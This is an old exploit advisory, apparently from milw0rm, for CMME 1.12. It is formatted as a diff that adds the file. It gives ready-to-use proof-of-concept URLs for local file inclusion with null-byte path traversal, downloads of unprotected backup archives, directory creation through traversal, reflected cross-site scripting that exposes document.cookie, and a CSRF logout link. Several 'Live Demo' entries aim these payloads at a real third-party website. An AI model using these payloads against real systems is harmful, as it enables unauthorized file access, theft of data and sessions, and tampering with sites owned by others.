@@ -1,0 +1,108 @@
+##################################################################################################################
+[+] CMME 1.12 (LFI/XSS/CSRF/Download Backup/MkDir) Multiple Remote Vulnerabilities 
+[+] Discovered By SirGod                        
+[+] www.mortal-team.org                        
+[+] Greetz : E.M.I.N.E.M,Ras,Puscas_marin,ToxicBlood,MesSiAH,xZu,HrN,kemrayz
+##################################################################################################################
+
+[+] Local File Inclusion
+
+    Note : magic_quotes_gpc must be off.
+ 
+    Example :
+
+     http://localhost/index.php?page=weblog&env=[Local File]%00
+
+    PoC :
+
+     http://localhost/index.php?page=weblog&env=../../../autoexec.bat%00
+    
+
+[+] Download Backup
+
+     Example 1:
+
+       http://localhost/backup/[Backup Name].zip
+
+     PoC 1:
+
+       http://localhost/backup/cmme_data.zip
+
+     Live Demo 1:
+
+       http://cmme.oesterholt.net/backup/cmme_data.zip
+
+     Example 2:
+
+       http://localhost/backup/[Backup Name].zip
+
+     PoC 2:
+
+       http://localhost/backup/cmme_cmme.zip
+
+     Live Demo 2:
+
+       http://cmme.oesterholt.net/backup/cmme_cmme.zip
+
+      
+[+] Make Directory
+
+    You can make multiple directories in website root folder.
+
+      Example 1:
+     
+        http://localhost/admin.php?action=login&page=home&script=index.php&env=[Directory]
+
+      PoC 1:
+
+        http://localhost/admin.php?action=login&page=home&script=index.php&env=!!!Owned!!!
+
+
+    Or you can make dir in previous directory,etc.
+
+      Example 2:
+
+        http://localhost/admin.php?action=login&page=home&script=index.php&env=../[Directory]
+
+      PoC 2:
+
+        http://localhost/admin.php?action=login&page=home&script=index.php&env=../!!!Owned!!!
+
+
+[+] Cross Site Scripting  
+
+     Example 1:
+     
+      http://localhost/statistics.php?action=hstat_year&page=[XSS}&env=data
+
+     PoC 1:
+
+      http://localhost/statistics.php?action=hstat_year&page=<script>alert(document.cookie)</script>&env=data
+
+     Live Demo 1:
+
+      http://cmme.oesterholt.net/statistics.php?action=hstat_year&page=<script>alert(document.cookie)</script>&env=data
+
+     Example 2:
+
+      http://localhost/statistics.php?action=hstat_year&year=[XSS]&env=data
+
+     PoC 2:
+
+      http://localhost/statistics.php?action=hstat_year&year=<script>alert(document.cookie)</script>&env=data
+
+     Live Demo 2:
+     
+      http://cmme.oesterholt.net/statistics.php?action=hstat_year&year=<script>alert(document.cookie)</script>&env=data
+
+
+[+] Cross Site Request Forgery
+
+    If an logged in user with administrator privileges clicks the following link he will be logged out.
+
+      http://localhost/admin.php?action=logout&page=home&env=data
+
+
+##################################################################################################################
+
+# milw0rm.com [2008-08-26]
